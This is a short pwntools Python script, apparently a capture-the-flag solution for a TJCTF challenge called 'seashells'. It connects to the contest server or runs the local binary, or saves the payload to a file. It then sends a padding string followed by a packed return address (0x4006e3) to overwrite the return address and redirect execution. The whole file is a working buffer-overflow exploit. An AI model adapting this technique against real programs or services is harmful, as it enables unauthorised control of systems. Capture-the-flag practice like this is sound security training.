from pwn import *

if 'rem' in sys.argv:
    r = remote('p1.tjctf.org', 8009)
elif 'file' in sys.argv:
    class getPayload:
        def __init__(self):
            self.payload = b''
        def send(self, oper):
            self.payload += oper
        def interactive(self):
            file = open('payload', 'wb')
            file.write(self.payload)
            file.close()
    r = getPayload()
else:
    r = process('./seashells')

padding = b'B9alaLbY4ealaLbY4e'

r.send(padding)
r.send(p64(0x4006e3))
r.send(b'\n')

r.interactive()
